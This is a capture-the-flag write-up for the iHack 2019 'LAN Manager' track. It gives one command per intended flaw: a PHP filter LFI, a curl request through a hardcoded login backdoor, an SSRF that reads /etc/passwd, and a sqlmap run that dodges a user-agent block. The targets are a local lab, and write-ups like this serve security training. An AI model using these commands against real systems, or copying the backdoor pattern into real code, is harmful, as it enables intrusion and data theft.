# LAN Manager - iHack 2019 by Pourliver

## Description
This track contains 4 flags. It was meant to be a simple track, without any dead-ends. Each possible vulnerability is rewarded with a flag. I tried to keep it simple for beginners, meaning that if you think there's something worth looking into, you're probably right. The goal of this track isn't to guess, bruteforce, or bypass complex filters. It's simply to understand where the vulnerability is, and how to make some value out of it. Hope you enjoy!

## Walkthrough of each vulnerabilities
1 - LFI
- The LFI allows the attack to read the source of the php files

      http://127.0.0.1:8080/?page=php://filter/convert.base64-encode/resource=config

2 - Backdoor in the code / Login bypass
- The "ugly" code found inside the codebase allows to bypass the unimplemented login. The following curl passes the backdoor

      curl "http://127.0.0.1:8080/p.php?username=s3cRet4DmiN&password=hunter2" --cookie "LET_ME_IN=The magic word is PLEASE" -I

3 - SSRF
- The admin panel is vulnerable to the "file" protocol, allowing to fetch local files.

      curl "http://127.0.0.1:8080/?page=admin.php&url=file:///etc/passwd" --cookie "PHPSESSID=YOUR_BACKDOOR_COOKIE"

4 - (Optional) Blind SQLi
- The stats.php page is vulnerable to an easy sql injection. It can be easily solved manually, or with sqlmap. The server blocks the sqlmap user-agent, so we have to tamper it with --random-agent

      sqlmap -u "http://127.0.0.1:8080/?page=home.php&mode=0" -p mode --threads 10 --level 5 --risk 3 --dbms sqlite3 --random-agent -a

